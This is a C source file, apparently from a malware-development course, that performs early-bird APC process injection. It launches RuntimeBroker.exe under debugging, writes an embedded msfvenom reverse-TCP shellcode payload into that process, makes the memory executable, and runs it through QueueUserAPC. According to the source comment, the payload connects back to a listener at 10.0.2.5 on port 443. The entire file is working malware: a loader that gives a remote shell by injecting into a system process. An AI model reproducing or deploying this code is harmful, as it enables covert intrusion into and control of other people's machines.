// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)


#define TARGET_PROCESS	"Runtimebroker.exe"


// msfvenom -p windows/x64/shell_reverse_tcp lhost=10.0.2.5 lport=443 EXITFUNC=thread -f c
unsigned char Payload[] = {
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
	"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
	"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x02\x05"
	"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
	"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
	"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
	"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
	"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
	"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
	"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
	"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
	"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
	"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
	"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
	"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
	"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
	"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
	"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
	"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
};

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n[i] Allocated Memory At : 0x%p \n", *ppAddress);

	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CreateDebuggedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR lpPath	[MAX_PATH * 2];
	CHAR WnDr [MAX_PATH];

	STARTUPINFO	Si = { 0 };
	PROCESS_INFORMATION	Pi = { 0 };

	// cleaning the structs 
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);
	
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;
	
	return FALSE;
}

int main() {
	
	HANDLE	hProcess = NULL, hThread = NULL;
	DWORD dwProcessId = NULL;
	PVOID pAddress = NULL;

	if (!CreateDebuggedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("[i] Target Process Created With Pid : %d \n", dwProcessId);
	printf("[+] DONE \n");

	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");

//	running QueueUserAPC
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);
 
	printf("[i] Detaching The Target Process ... \n");
	DebugActiveProcessStop(dwProcessId);
	printf("[+] DONE \n\n");

	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}